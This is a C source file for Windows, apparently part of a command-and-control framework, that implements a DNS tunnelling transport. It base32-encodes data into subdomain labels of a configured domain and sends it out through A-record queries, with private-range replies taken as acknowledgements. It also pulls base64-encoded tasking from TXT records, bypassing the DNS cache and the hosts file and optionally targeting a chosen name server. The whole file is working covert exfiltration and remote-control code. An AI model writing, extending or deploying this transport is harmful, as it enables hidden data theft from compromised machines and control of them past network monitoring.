/**
 * transport_dns.c - DNS-based C2 transport (TXT/A records)
 */
#include <windows.h>
#include <winsock2.h>
#include <windns.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")
#include "../../include/base64.h"
#include "../../include/transport.h"

#pragma comment(lib, "dnsapi.lib")

#ifndef DNS_DEFAULT_CHUNK
#define DNS_DEFAULT_CHUNK 189
#endif

static const char b32_alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

static DWORD b32_encode(const BYTE *in, DWORD in_len, char *out, DWORD out_cap) {
    DWORD o = 0, i = 0, bits = 0;
    ULONG acc = 0;

    while (i < in_len || bits > 0) {
        if (bits < 5) {
            if (i < in_len) {
                acc = (acc << 8) | in[i++];
                bits += 8;
            } else {
                acc <<= (5 - bits);
                bits = 5;
            }
        }
        if (o + 1 >= out_cap) break;
        out[o++] = b32_alphabet[(acc >> (bits - 5)) & 0x1F];
        bits -= 5;
    }
    if (o < out_cap) out[o] = '\0';
    return o;
}

static BOOL dns_build_query_labels(const char *b32_part, const char *session_id,
                                   const char *msg_type, const char *domain,
                                   char *qname, DWORD qname_cap) {
    if (!domain || !domain[0] || !session_id || !msg_type) return FALSE;

    qname[0] = '\0';
    DWORD pos = 0;
    DWORD part_len = b32_part ? (DWORD)lstrlenA(b32_part) : 0;
    DWORD off = 0;

    while (off < part_len) {
        DWORD n = part_len - off;
        if (n > 63) n = 63;
        if (pos > 0) {
            if (pos + 1 >= qname_cap) return FALSE;
            qname[pos++] = '.';
        }
        if (pos + n >= qname_cap) return FALSE;
        CopyMemory(qname + pos, b32_part + off, n);
        pos += n;
        off += n;
    }

    char suffix[384];
    int sn = _snprintf(suffix, sizeof(suffix), ".%s.%s.%s", msg_type, session_id, domain);
    if (sn <= 0 || (DWORD)(pos + sn) >= qname_cap) return FALSE;
    CopyMemory(qname + pos, suffix, sn + 1);
    return TRUE;
}

static BOOL dns_query_a(DNS_TRANSPORT_CONFIG *cfg, const char *qname, DWORD *ack_ip) {
    PDNS_RECORD pRec = NULL;
    IP4_ARRAY *pSrvList = NULL;

    if (cfg->ns_server[0]) {
        pSrvList = (IP4_ARRAY *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IP4_ARRAY) + sizeof(DWORD));
        if (!pSrvList) return FALSE;
        pSrvList->AddrCount = 1;
        pSrvList->AddrArray[0] = inet_addr(cfg->ns_server);
    }

    DNS_STATUS status = DnsQuery_A(
        qname,
        DNS_TYPE_A,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
        pSrvList,
        &pRec,
        NULL);

    if (pSrvList) HeapFree(GetProcessHeap(), 0, pSrvList);

    if (status != 0 || !pRec) return FALSE;

    BOOL ok = FALSE;
    for (PDNS_RECORD r = pRec; r; r = r->pNext) {
        if (r->wType == DNS_TYPE_A) {
            if (ack_ip) *ack_ip = r->Data.A.IpAddress;
            ok = TRUE;
            break;
        }
    }
    DnsRecordListFree(pRec, DnsFreeRecordList);
    return ok;
}

static BOOL dns_query_txt(DNS_TRANSPORT_CONFIG *cfg, const char *qname,
                          BYTE **out_data, DWORD *out_len) {
    PDNS_RECORD pRec = NULL;
    IP4_ARRAY *pSrvList = NULL;

    if (cfg->ns_server[0]) {
        pSrvList = (IP4_ARRAY *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IP4_ARRAY) + sizeof(DWORD));
        if (!pSrvList) return FALSE;
        pSrvList->AddrCount = 1;
        pSrvList->AddrArray[0] = inet_addr(cfg->ns_server);
    }

    DNS_STATUS status = DnsQuery_A(
        qname,
        DNS_TYPE_TEXT,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
        pSrvList,
        &pRec,
        NULL);

    if (pSrvList) HeapFree(GetProcessHeap(), 0, pSrvList);

    if (status != 0 || !pRec) return FALSE;

    BOOL ok = FALSE;
    for (PDNS_RECORD r = pRec; r; r = r->pNext) {
        if (r->wType == DNS_TYPE_TEXT && r->Data.TXT.pStringArray) {
            const char *txt = r->Data.TXT.pStringArray[0];
            if (txt) {
                DWORD cap = (DWORD)(lstrlenA(txt) * 3 / 4 + 4);
                BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
                if (buf) {
                    DWORD dlen = b64_decode(txt, (DWORD)lstrlenA(txt), buf, cap);
                    if (dlen > 0) {
                        *out_data = buf;
                        *out_len = dlen;
                        ok = TRUE;
                    } else {
                        HeapFree(GetProcessHeap(), 0, buf);
                    }
                }
            }
            break;
        }
    }
    DnsRecordListFree(pRec, DnsFreeRecordList);
    return ok;
}

BOOL dns_transport_send(DNS_TRANSPORT_CONFIG *cfg, const char *session_id,
                        const BYTE *data, DWORD data_len) {
    return dns_transport_send_typed(cfg, session_id, "d", data, data_len);
}

BOOL dns_transport_send_typed(DNS_TRANSPORT_CONFIG *cfg, const char *session_id,
                              const char *msg_type, const BYTE *data, DWORD data_len) {
    if (!cfg || !session_id || !msg_type) return FALSE;

    DWORD chunk_size = cfg->chunk_size ? cfg->chunk_size : DNS_DEFAULT_CHUNK;
    char b32[MAX_OUTPUT_SIZE * 2];
    b32[0] = '\0';

    if (data && data_len > 0) {
        if (b32_encode(data, data_len, b32, sizeof(b32)) == 0) return FALSE;
    }

    DWORD offset = 0;
    DWORD b32_len = (DWORD)lstrlenA(b32);

    do {
        char chunk[256];
        DWORD clen = b32_len - offset;
        if (clen > chunk_size) clen = chunk_size;
        CopyMemory(chunk, b32 + offset, clen);
        chunk[clen] = '\0';

        char qname[512];
        if (!dns_build_query_labels(chunk, session_id, msg_type, cfg->domain, qname, sizeof(qname)))
            return FALSE;

        DWORD ack = 0;
        if (!dns_query_a(cfg, qname, &ack)) return FALSE;

        /* ACK: 10.x.x.x = success */
        if ((ack & 0xFF000000) != 0x0A000000 && ack != 0)
            return FALSE;

        offset += clen;
    } while (offset < b32_len);

    if (b32_len == 0) {
        char qname[512];
        if (!dns_build_query_labels("ping", session_id, msg_type, cfg->domain, qname, sizeof(qname)))
            return FALSE;
        return dns_query_a(cfg, qname, NULL);
    }

    return TRUE;
}

BOOL dns_transport_recv(DNS_TRANSPORT_CONFIG *cfg, const char *session_id,
                        BYTE **out_data, DWORD *out_len) {
    if (!cfg || !session_id || !out_data || !out_len) return FALSE;
    *out_data = NULL;
    *out_len = 0;

    char qname[512];
    if (!dns_build_query_labels("ping", session_id, "c", cfg->domain, qname, sizeof(qname)))
        return FALSE;

    return dns_query_txt(cfg, qname, out_data, out_len);
}
